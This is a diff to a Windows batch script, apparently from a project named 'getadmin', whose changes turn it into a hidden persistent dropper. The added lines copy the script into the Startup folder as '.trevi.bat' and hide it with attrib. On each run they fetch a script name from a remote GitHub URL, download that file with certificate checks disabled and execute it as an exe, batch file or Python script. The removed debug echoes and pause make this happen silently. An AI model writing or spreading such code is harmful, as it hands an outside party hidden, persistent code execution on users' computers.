@@ -1,11 +1,10 @@
 @echo off
-goto getScript
-set "_path=%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"
-if not exist "%_path%\.trevi.bat" (
+set "_path=%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\.trevi.bat"
+if not exist "%_path%" (
     xcopy "%~f0" "%_path%"
-) else (
-    goto getScript
+    attrib +h +s +r "%_path%"
 )
+goto getScript
 exit /b
 
 :getScript
@@ -19,18 +18,16 @@ for /f %%i in ('curl -kLs "https://github.com/aritz331/getadmin/raw/main/current
 call :checkExtension exe exe "call"
 call :checkExtension bat batch "cmd /c"
 call :checkExtension py python "python"
-call :checkExtension none exe "exit /b"
+call :checkExtension trevi exe "exit /b 0"
 exit /b
 
 :checkExtension
 if [%_currentScriptExt%]==[.%~1] (
-    call :executeScript %~2/%_currentScript%
+    call :executeScript %~2/%_currentScript% %3
 )
 exit /b
 
 :executeScript
-echo %~1
 curl -kLOs "https://github.com/aritz331/getadmin/raw/main/scripts/%~1"
-echo %~3 %_currentScript%
-pause
+%~2 %_currentScript%
 exit /b
